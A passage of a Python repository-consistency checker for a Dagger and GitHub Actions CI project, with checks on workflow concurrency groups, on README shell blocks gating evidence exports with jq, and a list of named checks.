        block = _top_level_block(path.read_text(encoding="utf-8").splitlines(), "concurrency")
        group = (block or {}).get("group", "")
        cancel = (block or {}).get("cancel-in-progress", "")
        if (
            block is None
            or not group.startswith("${{ github.workflow }}-")
            or _PR_GROUP not in group
            or "github.run_id" not in group
            or cancel != _PR_ONLY_CANCEL
        ):
            problems.append(
                f"{rel}  must carry the top-level concurrency block that cancels a "
                f"superseded pull-request run and groups nothing else: a group of "
                f"`${{{{ github.workflow }}}}-` plus {_PR_GROUP} on a pull request and "
                f"github.run_id otherwise, with cancel-in-progress: {_PR_ONLY_CANCEL}. "
                f"A group without the workflow name cancels across workflows (groups "
                f"are repository-wide); one keyed on the ref collapses pushes"
            )
    commit_files = sorted(
        {p for pattern in COMMIT_WORKFLOW_GLOBS for p in inv.root.glob(pattern) if p.is_file()}
    )
    if not commit_files:
        problems.append(
            f"no file matches {', '.join(COMMIT_WORKFLOW_GLOBS)}, so the commit half of "
            f"this check grades nothing; update the globs to where the commit workflows live"
        )
    for path in commit_files:
        rel = path.relative_to(inv.root).as_posix()
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if line.lstrip().startswith("#") or not _CONCURRENCY_KEY_RE.match(line):
                continue
            problems.append(
                f"{rel}:{lineno}  declares `concurrency:` on a commit workflow. GitHub "
                f"keeps one pending run per group and cancels the waiting one, so the "
                f"commits pushed in between never get commit-stage evidence; every "
                f"merge to main gets its own run"
            )
    return problems


# The first commands a newcomer copies. A `dagger call ... export --path x.json`
# exits 0 whatever the scan concluded — the verdict is `passed` in the file — so
# a first check that stops at the export teaches a gate that blocks nothing.
# Each such block must grade the file it wrote with `jq -e '.passed == true'`,
# and the export must be chained to it (`&&`, or `set -e` in the block), or a
# failed export falls through to grading a stale file from an earlier run.
# This proves the commands are shaped to gate, not that a scan passes.
FIRST_USE_SURFACES = (
    "README.md",
    "docs/tutorials/getting-started.md",
)
_FENCE_RE = re.compile(r"^```(\w*)\s*$")
_EXPORT_JSON_RE = re.compile(r"\bexport\s+--path[ =]\s*['\"]?(\S+?\.json)['\"]?(?=\s|$)")
_SET_E_RE = re.compile(r"^\s*set\s+-[a-zA-Z]*e")


def _shell_blocks(text: str) -> list[tuple[int, str]]:
    """(first line number, body) of every fenced bash/sh/shell block."""
    blocks: list[tuple[int, str]] = []
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        m = _FENCE_RE.match(lines[i].strip())
        if m is None:
            i += 1
            continue
        lang, start, body = m.group(1), i + 2, []
        i += 1
        while i < len(lines) and lines[i].strip() != "```":
            body.append(lines[i])
            i += 1
        i += 1
        if lang in ("bash", "sh", "shell"):
            blocks.append((start, "\n".join(body)))
    return blocks


def _strip_dot_slash(path: str) -> str:
    return path[2:] if path.startswith("./") else path


def check_first_check_gates(inv: Inventory) -> list[str]:
    """A first-use `dagger call ... export --path *.json` is gated on `passed`."""
    problems: list[str] = []
    for rel in FIRST_USE_SURFACES:
        path = inv.root / rel
        if not _readable(path):
            problems.append(
                f"{rel}  is not there to grade. It is a first-use surface this check "
                f"requires to gate its evidence export; if it moved, move the name in "
                f"FIRST_USE_SURFACES with it"
            )
            continue
        exports = 0
        for start, body in _shell_blocks(path.read_text(encoding="utf-8")):
            logical = logical_lines(body)
            set_e = any(_SET_E_RE.match(line) for _n, line in logical)
            for n, line in logical:
                if "dagger" not in line or " call " not in line:
                    continue
                m = _EXPORT_JSON_RE.search(line)
                if m is None:
                    continue
                exports += 1
                target = _strip_dot_slash(m.group(1))
                where = f"{rel}:{start + n - 1}"
                gated = any(
                    "jq -e" in later and ".passed == true" in later
                    and any(_strip_dot_slash(tok.strip("'\"")) == target for tok in later.split())
                    for _m, later in logical if _m > n
                ) or (
                    "jq -e" in line[m.end():] and ".passed == true" in line[m.end():]
                )
                if not gated:
                    problems.append(
                        f"{where}  exports {m.group(1)} and never gates on it. `dagger call` "
                        f"exits 0 whatever the scan found; follow it with "
                        f"`jq -e '.passed == true' {m.group(1)} > /dev/null` in the same block"
                    )
                elif not (set_e or line.rstrip().endswith("&&")):
                    problems.append(
                        f"{where}  gates {m.group(1)} in a separate statement. Chain the "
                        f"export to the jq gate with `&&` (or `set -e` in the block), or a "
                        f"failed export falls through to grading a stale file"
                    )
        if rel == "README.md" and exports == 0:
            problems.append(
                f"{rel}  has no `dagger call ... export --path *.json` block left to grade. "
                f"The first check moved or changed shape; update FIRST_USE_SURFACES or "
                f"this check, rather than let it pass over nothing"
            )
    return problems


CHECKS = (
    ("declared paths exist", check_declared_paths_exist),
    ("module inventory agrees with discovery", check_module_inventory),
    ("no undeclared active documents", check_undeclared_markdown),
    ("cicd pins agree on one version", check_pin_consistency),
    ("documented Dagger commands exist", check_dagger_commands),
    ("local links resolve", check_local_links),
    ("pin_guard.pending_repairs entries are still needed", check_pending_pin_repairs),
    ("workflow actions can start a run", check_workflow_actions_trusted),
    ("workflow run: steps stay under the startup ceiling", check_workflow_step_sizes),
    ("PR verdict comments are updated in place, identically", check_pr_comment_upsert),
    ("--include accepts the same languages in the module and the guard", check_include_language_set),
    ("reusable workflow outputs resolve end to end", check_workflow_output_chain),
    ("synced file copies are byte-identical", check_synced_files),
    ("generated file copies match their generator", check_generated_files),
    ("behavioural smokes are runnable locally and run in CI", check_smoke_scripts_are_wired),
    ("the evidence schemaVersion agrees everywhere", check_schema_version_coherence),
    ("every dagger call's module was developed by the wrapper", check_cross_module_develop),
    ("every cicd reference is a version pin", check_cicd_refs_are_versions),
    ("every composite parameter is reachable from a starter surface", check_composite_params_reachable),
    ("an optional flag is passed only when its value exists", check_guarded_flags),
    ("no surface documents the refused SAST default", check_sast_default_wording),
    ("no expression is spliced into a run: body", check_run_expressions),
    ("a change diff that could not be computed is not swallowed", check_change_diff_not_swallowed),
    ("superseded PR runs cancel, commit runs are never grouped", check_superseded_runs),
    ("a first-use evidence export gates on passed", check_first_check_gates),
)


def check_all(inv: Inventory) -> list[tuple[str, list[str]]]:
    """Run every check. Returns (check name, problems) in declaration order."""
    return [(name, fn(inv)) for name, fn in CHECKS]
